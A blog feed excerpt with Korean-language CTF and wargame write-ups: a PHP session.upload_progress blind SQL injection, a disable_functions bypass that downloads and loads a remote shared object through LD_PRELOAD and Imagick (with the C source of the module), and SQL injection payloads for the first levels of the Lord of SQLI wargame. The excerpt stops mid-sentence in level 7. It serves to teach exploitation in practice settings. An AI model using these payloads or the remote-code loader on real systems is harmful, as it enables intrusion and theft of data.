      <title>PwnThyBytes CTF - Baby sql is not baby anymore</title>
      <link href="/pwnthybytes-ctf-baby-sql-is-not-baby-anymore/"/>
      <url>/pwnthybytes-ctf-baby-sql-is-not-baby-anymore/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/2019/10/image.png" alt="img"></p><p><code>PHP</code>의 <code>session.upload_progress</code> 에 관한 문제입니다.<br>기본 상태에서 활성화 되어있는 <code>session.upload_progress</code> 옵션은, <code>session_start</code> 함수의 실행 없이 <code>$_SESSION</code> 변수가 설정될 수 있도록 합니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SESSION <span class="keyword">as</span> $key =&gt; $value): $_SESSION[$key] = filter($value); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value): $_GET[$key] = filter($value); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value): $_POST[$key] = filter($value); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $key =&gt; $value): $_REQUEST[$key] = filter($value); <span class="keyword">endforeach</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">!is_string($value) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">"Hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> addslashes($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>문제의 <code>index.php</code> 에서는 내부 변수들에 대해 필터링 과정을 거친 후, <code>templates</code> 폴더 내부의 스크립트를 참조하는 방식으로 구성됩니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!<span class="keyword">isset</span>($_SESSION) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">"Direct access on this script is not allowed!"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'db.php'</span>;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">'SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`="'</span>.$_GET[<span class="string">'username'</span>].<span class="string">'" and password="'</span>.md5($_GET[<span class="string">'password'</span>]).<span class="string">'";'</span>;</span><br><span class="line">$result = $con-&gt;query($sql);</span><br></pre></td></tr></table></figure><p><code>/templates/login.php</code> 페이지 등은 최상단에서 <code>isset($_SESSION)</code> 구문으로 하여금, 페이지의 직접 참조를 방지하고 있습니다.<br><code>index.php</code> 페이지를 통해 참조될 때에는 <code>session_start</code> 로 인해 <code>$_SESSION</code> 가 설정된다는 점을 이용한 것입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">'request'</span>);</span><br><span class="line"><span class="keyword">const</span> dict = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;'</span>;</span><br><span class="line"></span><br><span class="line">option = <span class="function">(<span class="params">FLAG</span>) =&gt;</span> (&#123;</span><br><span class="line">    method: <span class="string">"POST"</span>,</span><br><span class="line">    url : <span class="string">'http://137.117.210.176:13372/templates/login.php?username='</span> + </span><br><span class="line">            <span class="built_in">escape</span>(<span class="string">`"||(select secret like '<span class="subst">$&#123;FLAG&#125;</span>%' from flag_tbl)#`</span>),</span><br><span class="line">    headers : &#123;</span><br><span class="line">        <span class="string">'Content-Type'</span> : <span class="string">'multipart/form-data'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span> : <span class="string">'PHPSESSID=1'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    multipart : [&#123;</span><br><span class="line">        <span class="string">'Content-Disposition'</span> : <span class="string">'form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'</span>,</span><br><span class="line">        <span class="string">'body'</span> : <span class="string">'1'</span> </span><br><span class="line">    &#125;]</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params">FLAG = <span class="string">''</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> chr <span class="keyword">of</span> dict) &#123;</span><br><span class="line">        request(option(FLAG + chr), <span class="function"><span class="keyword">function</span>(<span class="params">err, res, body</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (body.indexOf(<span class="string">'Try again!'</span>) === <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(FLAG);</span><br><span class="line">                exploit(FLAG + chr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exploit();</span><br></pre></td></tr></table></figure><p><code>multipart/form-data</code> 형식으로 <code>session.upload_progress.name</code> 와 동일한 이름의 파라미터를 추가해 주는 것으로 <code>isset($_SESSION)</code> 조건식을 우회할 수 있었습니다.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PwnThyBytes CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BSides Delhi CTF - Eval Me</title>
      <link href="/bsides-delhi-ctf-eval-me/"/>
      <url>/bsides-delhi-ctf-eval-me/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$entropy= md5(<span class="string">"SpyD3r"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>] . <span class="string">"isBack"</span>);</span><br><span class="line">$SANDBOX = getcwd() . <span class="string">"/xxx/"</span> . $entropy;</span><br><span class="line">mkdir($SANDBOX);</span><br><span class="line">chdir($SANDBOX);</span><br><span class="line"><span class="keyword">echo</span> $entropy . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'input'</span>]);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>LD_PRELOAD + Imagick ffmpeg</code> 을 통한 <code>disable_functions bypass</code> 문제입니다.<br>자유롭게 PHP 코드 실행이 가능한 상태입니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># open_basedir</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html:&#x2F;tmp</span><br><span class="line"></span><br><span class="line"># disable_functions</span><br><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,stream_socket_sendto,stream_socket_client,pcntl_async_signals,error_log,system,exec,shell_exec,popen,proc_open,passthru,link,symlink,syslog,imap_open,ld,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen</span><br></pre></td></tr></table></figure><p>대부분 필수 함수들이 필터링 되어 있지만<br><code>putenv</code> 사용이 가능하므로 <code>LD_PRELOAD</code> 에 모듈 탑재가 가능하고<br><code>copy</code> 함수를 사용해 컴파일된 모듈 파일을 복사할 수 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'/tmp'</span>);</span><br><span class="line">touch(<span class="string">'1.mpeg'</span>);</span><br><span class="line">copy(<span class="string">'http://osix.kr/posix.so'</span>,<span class="string">'/tmp/posix.so'</span>);</span><br><span class="line">putenv(<span class="string">'CMD=./../../../../readFlag &gt; /tmp/output'</span>);</span><br><span class="line">putenv(<span class="string">'LD_PRELOAD=/tmp/posix.so'</span>);</span><br><span class="line"><span class="keyword">new</span> Imagick(<span class="string">'/tmp/1.mpeg'</span>);</span><br></pre></td></tr></table></figure><p>위 코드를 통해 서버로 모듈을 업로드 하고 명령을 실행할 수 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(join(<span class="string">''</span>, file(<span class="string">'/tmp/output'</span>)));</span><br></pre></td></tr></table></figure><p>file 함수를 사용해 결과를 확인할 수 있었습니다.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"CMD"</span>);</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>익스플로잇에 사용한 모듈의 소스코드는 위과 같습니다.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BSides Delhi CTF </tag>
            
            <tag> disable_functions bypass </tag>
            
            <tag> ffmpeg </tag>
            
            <tag> imagick </tag>
            
            <tag> open_basedir bypass </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lord of SQL Injection(LOS) Complete Solution</title>
      <link href="/los-solution/"/>
      <url>/los-solution/</url>
      
        <content type="html"><![CDATA[<blockquote><p>The Lord of the SQLI : The Fellowship of the SQLI, 2019</p><p><a href="https://los.rubiya.kr/" target="_blank" rel="noopener">https://los.rubiya.kr/</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">정도원(rubiya) 님이 운영하시는 LOS 워게임의 문제 풀이입니다.</span><br></pre></td></tr></table></figure><h3 id="1-gremlin"><a href="#1-gremlin" class="headerlink" title="1. gremlin"></a>1. gremlin</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); <span class="comment">// do not try to attack another table, database!</span></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_gremlin where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"gremlin"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>최소한의 필터링만 적용된 기본형의 문제입니다.<br>싱글쿼트를 넣어주는 것으로 간단하게 우회할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;&#39;||1#</span><br></pre></td></tr></table></figure><h3 id="2-cobolt"><a href="#2-cobolt" class="headerlink" title="2. cobolt"></a>2. cobolt</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_cobolt where id='&#123;$_GET[id]&#125;' and pw=md5('&#123;$_GET[pw]&#125;')"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"cobolt"</span>);</span><br><span class="line">  <span class="keyword">elseif</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result['id']&#125;&lt;br&gt;You are not admin :(&lt;/h2&gt;"</span>; </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문항과 거의 다르지 않습니다.<br>싱글쿼트을 삽입하고 뒷부분을 한 줄 주석으로 처리해 주면 우회가 가능합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;admin&#39;#</span><br></pre></td></tr></table></figure><h3 id="3-goblin"><a href="#3-goblin" class="headerlink" title="3. goblin"></a>3. goblin</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|\"|\`/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Quotes ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_goblin where id='guest' and no=&#123;$_GET[no]&#125;"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>; </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"goblin"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>쿼트가 필터링 되어있어 통상적인 방법으로는 문자열을 삽입할 수 없지만<br>mysql 에서는 문자열을 16진수 형태의 hex 코드로 대체할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : no&#x3D;0 union select 0x61646d696e</span><br></pre></td></tr></table></figure><h3 id="4-orc"><a href="#4-orc" class="headerlink" title="4. orc"></a>4. orc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello admin&lt;/h2&gt;"</span>; </span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">"select pw from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"orc"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>실제 패스워드를 알아내는 것이 문제의 목표입니다.<br>like 문을 사용하여 한글자씩 대입 해보면 답을 알 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : &#39;||pw like &#39;BRUTE_HERE%</span><br></pre></td></tr></table></figure><h3 id="5-wolfman"><a href="#5-wolfman" class="headerlink" title="5. wolfman"></a>5. wolfman</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/ /i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No whitespace ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_wolfman where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>; </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"wolfman"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>whitespace를 차단한다고 나와있지만 실제로는 Space(%20)만이 필터링 됩니다. mysql 에서는 Space(%20)를 제외하고도 %09, %0a, %0b, %0c, %0d, %2b, 괄호를 구분자로서 사용이 가능합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;&#39;||1%09limit%091,1#</span><br></pre></td></tr></table></figure><h3 id="6-darkelf"><a href="#6-darkelf" class="headerlink" title="6. darkelf"></a>6. darkelf</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect();  </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/or|and/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_darkelf where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>; </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"darkelf"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>쿼트 삽입으로 로그인을 우회할 수 있지만<br>guest 계정이 상위에 위치하고 있기에 조건문을 조작하거나<br>limit, order by 등을 사용해 주어야 합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Solution1 : pw&#x3D;&#39;||id&#x3D;&#39;admin&#39;#</span><br><span class="line">Solution2 : pw&#x3D;&#39;||1 limit 1,1#</span><br></pre></td></tr></table></figure><h3 id="7-orge"><a href="#7-orge" class="headerlink" title="7. orge"></a>7. orge</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/or|and/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_orge where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>; </span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">"select pw from prob_orge where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"orge"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>테이블에 계정이 여러개 존재하는 상황에서 admin의 비밀번호를 알아내는 문제입니다. 조건식에 쓰이는 and, or이 필터링 되었지만 mysql 에서 and, or는 각각 &amp;&amp;, || 으로 대체 